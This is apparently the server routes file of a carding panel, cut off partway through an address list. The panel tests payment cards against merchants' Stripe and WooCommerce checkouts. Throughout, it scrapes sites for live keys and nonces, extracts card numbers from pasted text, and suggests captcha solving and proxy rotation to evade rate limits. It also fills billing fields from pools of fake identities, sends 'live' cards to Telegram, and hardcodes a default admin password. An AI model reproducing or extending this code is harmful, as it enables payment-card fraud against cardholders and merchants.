import type { Express } from "express";
import { createServer, type Server } from "http";
import { ZodError } from "zod";
import { storage } from "./storage";
import { startBot, stopBot, isBotRunning, sendProxyFile, notifyLiveCardToChannel } from "./telegram-bot";
import { startMiner, stopMiner, isMinerRunning, resetMinerState } from "./miner";
import { startRangeMiner, stopRangeMiner, isRangeMinerRunning } from "./range-miner";
import { randomBytes } from "crypto";
import bcrypt from "bcrypt";
import { detectGateFromUrl } from "./gate-detector";
import { classifyResponse } from "./response-codes";
import { generateCards } from "./card-generator";
import { parseCardInput, lookupBin, invalidateProxyCache } from "./stripe-checker";
import { runGateCheck } from "./checker";
import { siteCooldown, listCachedSessions, clearAllSessions, listCooldownSites, invalidateSession } from "./site-cache";
import { readAIKey, writeAIKey, clearAIKey, maskAIKey, aiKeySource, type AIProvider, AI_PROVIDERS, hasAnyAIKey, getActiveProvider } from "./ai-key";
import { aiChat } from "./ai-chat";
import { processRawInput, extractURLs } from "./url-processor";
import { collectWebsites, collectWebsitesBatch, analyzeSiteGateway } from "./ai-collector";
import { configureGatesFromSites } from "./gate-configurer";
import { getAnalyzerState, setAnalyzerEnabled, runCycle, getSuggestion, dismissSuggestion, markSuggestionApplied } from "./ai-analyzer";
import { getClassifierState, setStrictDeclineMode, STRICT_DECLINE_CODES } from "./classifier-mode";
import { inspectThreeDsChallenge, headlessDrive, formatInspection } from "./three-ds-solver";
import { extractCards, extractBins, summarizeExtraction } from "./cc-extractor";
import { getAllFeatureStates, setFeatureEnabled, resetAllFeatures, FEATURE_KEYS, type FeatureKey } from "./feature-toggles";
import { getMaskState, setMaskEnabled } from "./mask-state";
import { getMassLimits, setMassLimit, resetMassLimits, MASS_LIMIT_HARD_CAP } from "./mass-limits";
import { parseGateSource } from "./py-gate-parser";
import { parseCheckoutLink, hitCheckoutWithCard, hitCheckoutWithCardRetry, hitCardsParallel, preflightSessionCheck, setProxyPool, getProxyCount, getCachedPmCount, cloneCheckoutSession, resolvePaymentLinkToCheckoutUrl } from "./stripe-hitter";
import { browserHitCards, closeBrowser, isBrowserAvailable } from "./browser-hitter";
import { autoGateName, safeHostname } from "./auto-name";
import { normalizeGatePaymentSettings } from "@shared/payment-method-aliases";
import { GATE_TYPES, GATE_TYPE_IDS } from "@shared/gate-types";
import {
  gateCreateSchema,
  gateImportCommitSchema,
  gateImportEntrySchema,
  gatePatchSchema,
  gateSettingsSchema,
} from "@shared/gate-settings";

// ─── Active-request counters (exposed via /api/system/stats) ─────────────────
let _activeChecks = 0;
let _activeHits   = 0;

/** Single source of truth for supported gate types — defined in
 *  @shared/gate-types.ts so the AI collector can "learn" the same catalog. */

function normalizeSettings(settings: Record<string, any> | undefined | null) {
  return gateSettingsSchema.parse(normalizeGatePaymentSettings(settings || {}));
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  // System stats — real process memory + active operations
  app.get("/api/system/stats", (_req, res) => {
    const mem = process.memoryUsage();
    const heapUsedMB  = Math.round(mem.heapUsed  / 1024 / 1024);
    const heapTotalMB = Math.round(mem.heapTotal / 1024 / 1024);
    const rssMB       = Math.round(mem.rss        / 1024 / 1024);
    const heapPercent = Math.round((mem.heapUsed / mem.heapTotal) * 100);
    const uptimeSec   = Math.round(process.uptime());
    res.json({
      memory:       { heapUsedMB, heapTotalMB, rssMB, heapPercent },
      uptime:       uptimeSec,
      platform:     process.platform,
      arch:         process.arch,
      nodeVersion:  process.version,
      activeChecks: _activeChecks + _activeHits,
    });
  });

  // Auth
  app.post("/api/auth/login", async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ message: "Username and password required" });
    }

    let user = await storage.getUserByUsername(username);

    if (!user) {
      if (username === "admin") {
        const defaultPass = "926696";
        const hashed = await bcrypt.hash(defaultPass, 10);
        user = await storage.createUser({ username, password: hashed });
      } else {
        return res.status(401).json({ message: "Invalid credentials" });
      }
    }

    const valid = await bcrypt.compare(password, user.password);
    if (!valid) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    return res.json({ id: user.id, username: user.username, role: user.role });
  });

  // Dashboard Stats
  app.get("/api/dashboard/stats", async (_req, res) => {
    const checkStats = await storage.getCheckStats();
    const proxyStats = await storage.getProxyStats();
    const gates = await storage.getGateConfigs();
    const logs = await storage.getSystemLogs(10);

    res.json({
      checks: checkStats,
      proxies: proxyStats,
      gates: gates.map(g => ({
        id: g.id,
        name: g.name,
        gateType: g.gateType,
        subType: g.subType,
        active: g.active,
        hasKey: !!(
          (g.settings as any)?.publicKey ||
          (g.settings as any)?.btClientToken
        ),
      })),
      recentLogs: logs,
    });
  });

  // Gate Configs
  app.get("/api/gates", async (_req, res) => {
    const gates = await storage.getGateConfigs();
    res.json(gates);
  });

  // Scrape a URL and return whatever common gate fields we can extract,
  // so the user can preview and apply hints into the edit dialog manually.
  app.post("/api/gates/scrape-hints", async (req, res) => {
    try {
      const url = (req.body?.url || "").trim();
      if (!url) return res.status(400).json({ message: "url required" });
      const resp = await fetch(url, {
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" },
        redirect: "follow",
        signal: AbortSignal.timeout(15_000),
      });
      const html = await resp.text();
      const m = (re: RegExp) => html.match(re)?.[1];
      const hints: Record<string, string> = {};
      const pk = m(/pk_live_[A-Za-z0-9]+/) as any; if (pk) hints.publicKey = String(pk);
      const acct = m(/\bacct_[A-Za-z0-9_-]{8,}\b/) as any; if (acct) hints.connectedAccount = String(acct);
      hints.wcNonce         = m(/"woocommerce-process-checkout-nonce":"([^"]+)"/) || m(/name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"/) || "";
      hints.wcStoreNonce    = m(/"nonce":"([0-9a-f]{10})"/) || "";
      hints.ajaxNonce       = m(/name="give-form-nonce"[^>]*value="([^"]+)"/) || m(/"give-form-nonce":"([^"]+)"/) || "";
      hints.gfPiNonce       = m(/"gfstripePaymentIntentNonce":"([^"]+)"/) || "";
      hints.walletConfigId  = m(/wallet_config_id["'\s:=]+["']?([a-f0-9-]{8,})["']?/i) || "";
      hints.giveFormId      = m(/give-form-id-prefix["'\s:=]+["']?([0-9]+)/i) || "";
      hints.gfFormId        = m(/gform_(?:wrapper|form)_(\d+)/) || "";
      hints.captchaSiteKey  = m(/data-sitekey=["']([^"']+)["']/i) || "";
      // Strip empty values so the UI only sees what was actually found
      for (const k of Object.keys(hints)) if (!hints[k]) delete hints[k];
      res.json({ ok: resp.ok, status: resp.status, hints });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // Session cache visibility — for the system / configs panel
  app.get("/api/sessions", (_req, res) => {
    res.json({
      sessions: listCachedSessions(),
      cooldowns: listCooldownSites(),
    });
  });
  app.delete("/api/sessions", (_req, res) => {
    const cleared = clearAllSessions();
    res.json({ cleared });
  });
  app.delete("/api/sessions/:hostname", (req, res) => {
    invalidateSession(`https://${req.params.hostname}`);
    res.json({ ok: true });
  });

  // Rule-based reconfigure suggestions from recent failure patterns.
  // Scans the last 200 check results for this gate's name and returns
  // setting tweaks the user can one-click apply.
  app.get("/api/gates/:id/failure-suggestions", async (req, res) => {
    try {
      const gates = await storage.getGateConfigs();
      const gate = (gates as any[]).find(g => g.id === req.params.id);
      if (!gate) return res.status(404).json({ message: "Gate not found" });

      const all = await storage.getCheckResults({ noLimit: true });
      const gateName = gate.name;
      const recent = (all as any[])
        .filter(r => r.gate === gateName)
        .slice(0, 200);
      if (recent.length === 0) return res.json({ sampleSize: 0, suggestions: [] });

      const declined = recent.filter(r => r.status === "declined").length;
      const errors   = recent.filter(r => r.status === "error").length;
      const approved = recent.filter(r => r.status === "approved").length;
      const captchaCount = recent.filter(r => /captcha/i.test(r.response || "")).length;
      const nonceCount   = recent.filter(r => /nonce|session expired|session error/i.test(r.response || "")).length;
      const rateLimited  = recent.filter(r => /rate.?limit|too many requests|429/i.test(r.response || "")).length;
      const noPmId       = recent.filter(r => /no payment method|no_pm_id|no_setup_intent/i.test(r.response || "")).length;
      const proxyErr     = recent.filter(r => /proxy|econnrefused|timeout/i.test(r.response || "")).length;
      const integration  = recent.filter(r => /integration surface|publishable key|invalid_request_error/i.test(r.response || "")).length;

      const suggestions: Array<{ reason: string; settings: Record<string, any>; confidence: number }> = [];

      if (captchaCount >= 3 && !gate.settings?.captchaApiKey) {
        suggestions.push({
          reason: `${captchaCount}/${recent.length} responses mention captcha — set a 2captcha API key to auto-solve Turnstile/hCaptcha`,
          settings: { captchaProvider: "2captcha" },
          confidence: 0.85,
        });
      }
      if (nonceCount >= 5 && !gate.settings?.wcBlockCheckout) {
        suggestions.push({
          reason: `${nonceCount}/${recent.length} nonce/session errors — try Store API (Block Checkout) flow instead of classic`,
          settings: { wcBlockCheckout: true },
          confidence: 0.7,
        });
      }
      if (rateLimited >= 3 && !gate.settings?.proxyOverride && !gate.settings?.proxyCountry) {
        suggestions.push({
          reason: `${rateLimited}/${recent.length} rate-limit signals — pin a sticky proxy or country to spread the load`,
          settings: { proxyCountry: "US" },
          confidence: 0.6,
        });
      }
      if (noPmId >= 3) {
        suggestions.push({
          reason: `${noPmId}/${recent.length} payment-method extraction failures — manually set wcPaySlug or re-detect the gate`,
          settings: { wcPaySlug: "stripe" },
          confidence: 0.55,
        });
      }
      if (integration >= 3 && !gate.settings?.walletConfigId) {
        suggestions.push({
          reason: `${integration}/${recent.length} integration-surface rejections — wallet_config_id may be missing/wrong; let the page-scrape extract it`,
          settings: { walletConfigId: "" },
          confidence: 0.5,
        });
      }
      if (proxyErr >= 5) {
        suggestions.push({
          reason: `${proxyErr}/${recent.length} proxy/timeout errors — increase timeout or disable proxy override`,
          settings: { timeout: 30000 },
          confidence: 0.5,
        });
      }
      if (approved === 0 && declined + errors >= 20 && !gate.settings?.liveOverrides?.length) {
        suggestions.push({
          reason: `0 approved in last ${declined + errors} attempts — bank may emit live signals our classifier treats as dead; add custom liveOverrides`,
          settings: { liveOverrides: "insufficient_funds, do_not_honor" },
          confidence: 0.4,
        });
      }

      res.json({
        sampleSize: recent.length,
        stats: { approved, declined, errors, captchaCount, nonceCount, rateLimited, noPmId, proxyErr, integration },
        suggestions: suggestions.sort((a, b) => b.confidence - a.confidence),
      });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // ── AI panel endpoints ─────────────────────────────────────────────────────
  app.get("/api/ai/status", async (_req, res) => {
    try {
      // "configured" means ANY provider has a key (so a DeepSeek-only setup
      // still unlocks the AI features, including the collector "polish" step).
      const active = getActiveProvider();
      const key = active ? readAIKey(active) : "";
      const src = active ? aiKeySource(active) : "none";
      // Count recent AI-related system logs for the "Usage" card
      const logs = await storage.getSystemLogs(100).catch(() => []);
      const aiLogs = (logs as any[]).filter(l => /^ai-|^aiconfig|^ai-reconfigurer/.test(l.source || ""));
      res.json({
        configured: !!key,
        masked: maskAIKey(key),
        source: src,
        envVarPresent: src === "env",
        canEdit: src !== "env", // env-var keys take precedence — UI can't override
        activeProvider: active,
        recentCount: aiLogs.length,
        recentEvents: aiLogs.slice(0, 10).map((l: any) => ({
          source: l.source, message: l.message, level: l.level, createdAt: l.createdAt,
        })),
      });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post("/api/ai/key", async (req, res) => {
    try {
      if (aiKeySource() === "env") {
        return res.status(409).json({ message: "NVIDIA_API_KEY env var is set — UI changes won't take effect until it's unset." });
      }
      const key = String(req.body?.key || "").trim();
      if (!key) return res.status(400).json({ message: "key required" });
      if (!/^[A-Za-z0-9_-]{10,}$/.test(key)) return res.status(400).json({ message: "key looks malformed" });
      writeAIKey(key);
      await storage.createSystemLog({ level: "INFO", source: "ai-key", message: `AI key updated via web (${maskAIKey(key)})` } as any);
      res.json({ ok: true, masked: maskAIKey(key) });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.delete("/api/ai/key", async (_req, res) => {
    try {
      if (aiKeySource() === "env") {
        return res.status(409).json({ message: "NVIDIA_API_KEY env var is set — unset it on the server to actually remove the key." });
      }
      clearAIKey();
      await storage.createSystemLog({ level: "INFO", source: "ai-key", message: "AI key removed via web" } as any);
      res.json({ ok: true });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── AI Analyzer — background-loop status, toggle, manual run, suggestions
  app.get("/api/ai/analyzer/status", (_req, res) => {
    try {
      const s = getAnalyzerState();
      res.json({
        enabled: s.enabled,
        lastRunAt: s.lastRunAt,
        lastRunStatus: s.lastRunStatus,
        cycleCount: s.cycleCount,
        suggestionCount: s.suggestions.length,
        pendingCount: s.suggestions.filter(x => x.status === "pending").length,
      });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post("/api/ai/analyzer/toggle", async (req, res) => {
    try {
      const on = !!req.body?.enabled;
      if (on && !readAIKey()) return res.status(400).json({ message: "Set the AI key first." });
      const s = setAnalyzerEnabled(on);
      await storage.createSystemLog({ level: "INFO", source: "ai-analyzer", message: `analyzer ${on ? "enabled" : "disabled"} via web` } as any).catch(() => {});
      res.json({ enabled: s.enabled });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post("/api/ai/analyzer/run", async (_req, res) => {
    try {
      if (!readAIKey()) return res.status(400).json({ message: "Set the AI key first." });
      const summary = await runCycle("manual");
      res.json({ ok: true, ...summary });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.get("/api/ai/suggestions", (_req, res) => {
    try {
      const s = getAnalyzerState();
      // Newest pending first, then applied/dismissed at the end
      const ordered = [...s.suggestions].sort((a, b) => {
        if (a.status === "pending" && b.status !== "pending") return -1;
        if (a.status !== "pending" && b.status === "pending") return 1;
        return b.createdAt.localeCompare(a.createdAt);
      });
      res.json({ suggestions: ordered });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post("/api/ai/suggestions/:id/apply", async (req, res) => {
    try {
      const sug = getSuggestion(req.params.id);
      if (!sug) return res.status(404).json({ message: "Suggestion not found" });
      if (sug.status !== "pending") return res.status(409).json({ message: `Already ${sug.status}` });
      const gates = await storage.getGateConfigs();
      const gate = (gates as any[]).find(g => g.id === sug.gateId);
      if (!gate) return res.status(404).json({ message: "Gate gone" });
      const merged = { ...((gate.settings as any) || {}) };
      let applied = 0;
      for (const [k, v] of Object.entries(sug.changes)) {
        const emptyOk = k === "btFlow" || k === "wcPaySlug" || k === "walletConfigId";
        if (v !== undefined && v !== null && (emptyOk || String(v).trim() !== "")) {
          merged[k] = v;
          applied++;
        }
      }
      await storage.updateGateConfig(sug.gateId, { settings: normalizeSettings(merged) } as any);
      markSuggestionApplied(sug.id);
      await storage.createSystemLog({ level: "SUCCESS", source: "ai-analyzer", message: `Applied ${applied} fields to ${sug.gateName} (suggestion ${sug.id})` } as any).catch(() => {});
      res.json({ ok: true, applied });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post("/api/ai/suggestions/:id/dismiss", async (req, res) => {
    try {
      const ok = dismissSuggestion(req.params.id);
      if (!ok) return res.status(404).json({ message: "Suggestion not found" });
      res.json({ ok: true });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── Classifier mode (global strict-decline toggle) ────────────────────────
  app.get("/api/classifier/mode", (_req, res) => {
    try {
      res.json({
        ...getClassifierState(),
        strictCodes: [...STRICT_DECLINE_CODES],
      });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post("/api/classifier/mode", async (req, res) => {
    try {
      const on = !!req.body?.strictDeclineMode;
      const s = setStrictDeclineMode(on);
      await storage.createSystemLog({ level: "INFO", source: "classifier", message: `strict-decline-mode ${on ? "enabled" : "disabled"} via web` } as any).catch(() => {});
      res.json({ ...s, strictCodes: [...STRICT_DECLINE_CODES] });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── Mass-check batch limits (owner-managed; gates /mass + .txt upload) ────
  app.get("/api/mass-limits", (_req, res) => {
    try { res.json({ ...getMassLimits(), hardCap: MASS_LIMIT_HARD_CAP }); }
    catch (e: any) { res.status(500).json({ message: e.message }); }
  });
  app.post("/api/mass-limits", async (req, res) => {
    try {
      const tier = req.body?.tier === "admin" ? "admin" : req.body?.tier === "user" ? "user" : null;
      const value = parseInt(String(req.body?.value), 10);
      if (!tier || !Number.isFinite(value)) {
        return res.status(400).json({ message: "tier (admin|user) and value (integer) required" });
      }
      const result = setMassLimit(tier, value);
      if ("error" in result) return res.status(400).json(result);
      await storage.createSystemLog({ level: "INFO", source: "mass-limits", message: `${tier} limit → ${value} via web` } as any).catch(() => {});
      res.json({ ...result, hardCap: MASS_LIMIT_HARD_CAP });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });
  app.delete("/api/mass-limits", async (_req, res) => {
    try {
      const r = resetMassLimits();
      await storage.createSystemLog({ level: "INFO", source: "mass-limits", message: "mass limits reset via web" } as any).catch(() => {});
      res.json({ ...r, hardCap: MASS_LIMIT_HARD_CAP });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── Feature toggles (owner-managed on/off switches for bot features) ─────
  app.get("/api/features", (_req, res) => {
    try { res.json({ features: getAllFeatureStates() }); }
    catch (e: any) { res.status(500).json({ message: e.message }); }
  });
  app.post("/api/features", async (req, res) => {
    try {
      const key = String(req.body?.key || "") as FeatureKey;
      const enabled = !!req.body?.enabled;
      if (!FEATURE_KEYS.includes(key)) return res.status(400).json({ message: `Unknown feature: ${key}` });
      setFeatureEnabled(key, enabled);
      await storage.createSystemLog({ level: "INFO", source: "features", message: `${key} → ${enabled ? "ON" : "OFF"} via web` } as any).catch(() => {});
      res.json({ features: getAllFeatureStates() });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });
  app.delete("/api/features", async (_req, res) => {
    try {
      resetAllFeatures();
      await storage.createSystemLog({ level: "INFO", source: "features", message: "All features reset to ON via web" } as any).catch(() => {});
      res.json({ features: getAllFeatureStates() });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── Sensitive-data mask (PAN body / CVV / ch_ / pi_ in Telegram + dashboard) ──
  app.get("/api/mask-state", (_req, res) => {
    try { res.json(getMaskState()); }
    catch (e: any) { res.status(500).json({ message: e.message }); }
  });
  app.put("/api/mask-state", async (req, res) => {
    try {
      const enabled = !!req.body?.enabled;
      const out = setMaskEnabled(enabled);
      await storage.createSystemLog({ level: "INFO", source: "mask", message: `Sensitive mask → ${enabled ? "ON" : "OFF"} via web` } as any).catch(() => {});
      res.json(out);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── CC / BIN extractor — pull cards from pasted text ──────────────────────
  app.post("/api/extract", (req, res) => {
    try {
      const text = String(req.body?.text || "");
      if (!text.trim()) return res.status(400).json({ message: "text required" });
      const mode = req.body?.mode === "bins" ? "bins" : "cards";
      const binLen: 6 | 8 = req.body?.binLength === 8 ? 8 : 6;
      if (mode === "bins") {
        const bins = extractBins(text, binLen);
        return res.json({ mode, count: bins.length, bins });
      }
      const cards = extractCards(text);
      return res.json({ mode, count: cards.length, cards, summary: summarizeExtraction(cards) });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── 3DS challenge inspector ───────────────────────────────────────────────
  //   POST /api/3ds/inspect  { url, headless?: bool }
  //   When headless=true and puppeteer is installed, drives the page through
  //   a headless browser; otherwise falls back to HTML inspection.
  app.post("/api/3ds/inspect", async (req, res) => {
    try {
      const url = String(req.body?.url || "").trim();
      if (!url) return res.status(400).json({ message: "url required" });
      const useHeadless = !!req.body?.headless;
      const insp = useHeadless
        ? await headlessDrive(url)
        : await inspectThreeDsChallenge(url);
      res.json({ ...insp, formatted: formatInspection(insp) });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // One-shot chat passthrough for the inline web AI widget.
  app.post("/api/ai/chat", async (req, res) => {
    try {
      const messages = Array.isArray(req.body?.messages) ? req.body.messages : null;
      if (!messages || messages.length === 0) return res.status(400).json({ message: "messages required" });
      const provider = req.body?.provider as AIProvider | undefined;
      const result = await aiChat({
        messages: [
          { role: "system", content: "You are a concise, technical assistant for the H@0 CHK V8 web admin. Reply in Markdown, keep replies short unless the user asks for detail." },
          ...messages.slice(-20),
        ],
        temperature: 0.5,
        maxTokens: 1024,
        provider,
      });
      if (!result) return res.status(500).json({ message: "No AI provider available. Add a key in AI Settings." });
      res.json({ reply: result.content, provider: result.provider, model: result.model, usage: result.usage });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // Per-gate health snapshot — pulls from in-memory siteCooldown tracker.
  app.get("/api/gates/:id/health", async (req, res) => {
    try {
      const gates = await storage.getGateConfigs();
      const gate = (gates as any[]).find(g => g.id === req.params.id);
      if (!gate) return res.status(404).json({ message: "Gate not found" });
      const url = (gate.settings?.siteUrl || gate.url || "") as string;
      if (!url) return res.json({ checks10min: 0, blocks: 0, lastCheck: null, url: null });
      res.json({ ...siteCooldown.getStats(url), url });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // ── Gate import from .py scripts / network-capture JSON (HAR) ──────────────
  // Two-step: POST /api/gates/import-source returns a parsed preview (no DB
  // write); the dashboard reviews/edits it, then commits via
  // POST /api/gates/import-source/commit. (Distinct from /api/gates/import,
  // which restores a JSON gate backup.)
  app.post("/api/gates/import-source", async (req, res) => {
    try {
      const filename = String(req.body?.filename || "").trim() || "upload";
      const content = String(req.body?.content ?? "");
      if (!content.trim()) {
        return res.status(400).json({ message: "Empty file — nothing to parse." });
      }
      // Guard against pathological uploads chewing CPU on regex scans.
      if (content.length > 5_000_000) {
        return res.status(413).json({ message: "File too large (max 5 MB)." });
      }
      const parsed = parseGateSource(filename, content);
      res.json(parsed);
    } catch (error: any) {
      res.status(500).json({ message: error?.message || "Failed to parse file" });
    }
  });

  app.post("/api/gates/import-source/commit", async (req, res) => {
    try {
      const { name, gateType, subType, url, active, settings } = gateImportCommitSchema.parse(req.body || {});
      const settingsSiteUrl =
        settings && typeof settings === "object" && "siteUrl" in settings
          ? (settings as Record<string, unknown>).siteUrl
          : "";
      const cleanUrl = String(url || settingsSiteUrl || "").replace(/\/+$/, "");
      const finalSettings = normalizeSettings(settings || {});
      if (cleanUrl && !finalSettings.siteUrl) finalSettings.siteUrl = cleanUrl;
      const autoSubTypes = getSubTypes(gateType);
      const gate = await storage.createGateConfig({
        name,
        gateType: String(gateType).toLowerCase(),
        subType: subType || autoSubTypes[0] || "standard",
        url: cleanUrl,
        active: active !== false,
        settings: finalSettings,
      });
      await storage.createSystemLog({
        level: "SUCCESS",
        message: `Gate "${name}" imported from ${finalSettings.importedFrom || "upload"}`,
        source: "admin",
      });
      res.json(gate);
    } catch (error: any) {
      if (error instanceof ZodError) {
        return res.status(400).json({ message: error.issues[0]?.message || "Invalid gate payload" });
      }
      res.status(500).json({ message: error?.message || "Failed to create gate" });
    }
  });

  app.post("/api/gates", async (req, res) => {
    try {
      const { name, gateType, subType, url, active, country, settings } = gateCreateSchema.parse(req.body);

      const autoSubTypes = getSubTypes(gateType);
      const cleanUrl = url.replace(/\/+$/, "");
      // The checker dispatcher reads settings.siteUrl, not the top-level url
      // column — keep them in sync so the gate actually targets what the UI shows.
      const finalSettings = normalizeSettings(settings || { autoDetected: true, subtypes: autoSubTypes });
      if (!finalSettings.siteUrl) finalSettings.siteUrl = cleanUrl;

      const gate = await storage.createGateConfig({
        name,
        gateType: gateType.toLowerCase(),
        subType: subType || autoSubTypes[0] || "standard",
        url: cleanUrl,
        active: active !== false,
        // Country is the routing tag (/autoroute → same-country gate). Optional
        // — empty/null means "any-country gate" per gate-router semantics.
        country: typeof country === "string" && country.trim() ? country.trim().toUpperCase() : null,
        settings: finalSettings,
      });

      await storage.createSystemLog({
        level: "SUCCESS",
        message: `Gate "${name}" (${gateType}) created`,
        source: "admin",
      });

      res.json(gate);
    } catch (error: any) {
      if (error instanceof ZodError) {
        return res.status(400).json({ message: error.issues[0]?.message || "Invalid gate payload" });
      }
      res.status(500).json({ message: error.message });
    }
  });

  app.patch("/api/gates/:id", async (req, res) => {
    try {
      const data = { ...gatePatchSchema.parse(req.body) } as Record<string, any>;
      // Keep settings.siteUrl in sync with the top-level url field — the checker
      // dispatcher reads settings.siteUrl exclusively, so an edit to the "Target
      // URL" field must propagate there or it silently has no effect.
      if (typeof data.url === "string" && data.url.trim()) {
        const cleanUrl = data.url.replace(/\/+$/, "");
        data.url = cleanUrl;
        data.settings = { ...(data.settings || {}), siteUrl: cleanUrl };
      }
      if (data.settings) {
        data.settings = normalizeSettings(data.settings);
      }
      const gate = await storage.updateGateConfig(req.params.id, data);
      if (!gate) return res.status(404).json({ message: "Gate not found" });
      res.json(gate);
    } catch (error: any) {
      if (error instanceof ZodError) {
        return res.status(400).json({ message: error.issues[0]?.message || "Invalid gate payload" });
      }
      res.status(500).json({ message: error.message });
    }
  });

  app.delete("/api/gates/:id", async (req, res) => {
    await storage.deleteGateConfig(req.params.id);
    res.json({ success: true });
  });

  // ── AI Gate Reconfigurer ──────────────────────────────────────────────────

  // Country inferred from gate URL TLD — used to pre-fill address pool hint for AI
  function inferCountryFromUrl(url: string): string {
    try {
      const host = new URL(url.startsWith("http") ? url : `https://${url}`).hostname;
      if (/\.co\.uk$|\.org\.uk$|\.me\.uk$|\.uk$/.test(host)) return "GB";
      if (/\.com\.au$|\.net\.au$|\.org\.au$|\.au$/.test(host)) return "AU";
      if (/\.ca$/.test(host)) return "CA";
      if (/\.de$/.test(host)) return "DE";
      if (/\.fr$/.test(host)) return "FR";
      if (/\.nl$/.test(host)) return "NL";
      if (/\.es$/.test(host)) return "ES";
      if (/\.it$/.test(host)) return "IT";
      if (/\.ie$/.test(host)) return "IE";
      if (/\.nz$/.test(host)) return "NZ";
    } catch { /* fall through */ }
    return "US";
  }

  // Realistic address pool per country — mirrors BILLING_DATA in stripe-checker.ts
  const ADDRESS_POOL: Record<string, { firstName: string[]; lastName: string[]; email: string[]; addresses: { line1: string; city: string; state: string; zip: string }[]; phone: string; currency: string }> = {
    US: {
      firstName: ["James","Michael","Robert","William","David","John","Richard","Thomas","Charles","Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua","Kenneth","Kevin","Brian","Timothy","Ronald","George","Edward"],
      lastName:  ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Thompson","White","Harris","Sanchez"],
      email:     ["gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com","aol.com","live.com","protonmail.com"],
      addresses: [
        { line1:"350 Fifth Avenue",    city:"New York",      state:"NY", zip:"10001" },
        { line1:"1234 Sunset Blvd",    city:"Los Angeles",   state:"CA", zip:"90028" },
        { line1:"233 S Wacker Dr",     city:"Chicago",       state:"IL", zip:"60606" },
        { line1:"800 Travis St",       city:"Houston",       state:"TX", zip:"77002" },
        { line1:"100 N Central Ave",   city:"Phoenix",       state:"AZ", zip:"85004" },
        { line1:"1515 Market St",      city:"Philadelphia",  state:"PA", zip:"19102" },
        { line1:"301 W 2nd St",        city:"Austin",        state:"TX", zip:"78701" },
        { line1:"600 4th Ave",         city:"Seattle",       state:"WA", zip:"98104" },
        { line1:"225 Broadway",        city:"San Diego",     state:"CA", zip:"92101" },
        { line1:"1437 Bannock St",     city:"Denver",        state:"CO", zip:"80202" },
      ],
      phone: "+1",
      currency: "usd",
    },
    GB: {
      firstName: ["Oliver","Jack","Harry","George","Noah","Charlie","Jacob","Alfie","Freddie","Oscar","James","William","Thomas","Henry","Archie","Joshua","Ethan","Samuel","Isaac","Edward"],
      lastName:  ["Smith","Jones","Williams","Taylor","Brown","Davies","Evans","Wilson","Thomas","Roberts","Johnson","Lewis","Walker","Robinson","Wood","Thompson","White","Watson","Jackson","Wright"],
      email:     ["gmail.com","yahoo.co.uk","hotmail.co.uk","outlook.com","btinternet.com","sky.com","virgin.net"],
      addresses: [
        { line1:"30 St Mary Axe",         city:"London",     state:"England",  zip:"EC3A 8BF" },
        { line1:"1 Piccadilly Gardens",    city:"Manchester", state:"England",  zip:"M1 1RG"  },
        { line1:"Victoria Square",         city:"Birmingham", state:"England",  zip:"B1 1BB"  },
        { line1:"1 Millennium Square",     city:"Leeds",      state:"England",  zip:"LS2 3AD" },
        { line1:"George Square",           city:"Glasgow",    state:"Scotland", zip:"G2 1DU"  },
        { line1:"2 Liver Street",          city:"Liverpool",  state:"England",  zip:"L1 0RH"  },
        { line1:"14 Princes Street",       city:"Edinburgh",  state:"Scotland", zip:"EH2 2AN" },
        { line1:"1 Castle Street",         city:"Bristol",    state:"England",  zip:"BS1 3XD" },
      ],
      phone: "+44",
      currency: "gbp",
    },
    CA: {
      firstName: ["Liam","Noah","William","Benjamin","Lucas","Henry","Alexander","Mason","Ethan","Daniel","Matthew","James","Logan","Jackson","Sebastian","Jack","Aiden","Owen","Samuel","Ryan"],
      lastName:  ["Smith","Brown","Tremblay","Martin","Roy","Wilson","Macdonald","Gagnon","Johnson","Taylor","Bouchard","Cote","Leblanc","Campbell","Lee","Stewart","Fortin","Morrison","Lavoie","Ouellet"],
      email:     ["gmail.com","yahoo.ca","hotmail.com","outlook.com","rogers.com","bell.net","telus.net"],
      addresses: [
        { line1:"100 King St W",           city:"Toronto",    state:"ON", zip:"M5X 1A9" },
        { line1:"200 Burrard St",          city:"Vancouver",  state:"BC", zip:"V6C 3L6" },
        { line1:"1000 De La Gauchetière",  city:"Montreal",   state:"QC", zip:"H3B 4W5" },
        { line1:"800 Macleod Trail SE",    city:"Calgary",    state:"AB", zip:"T2G 2M3" },
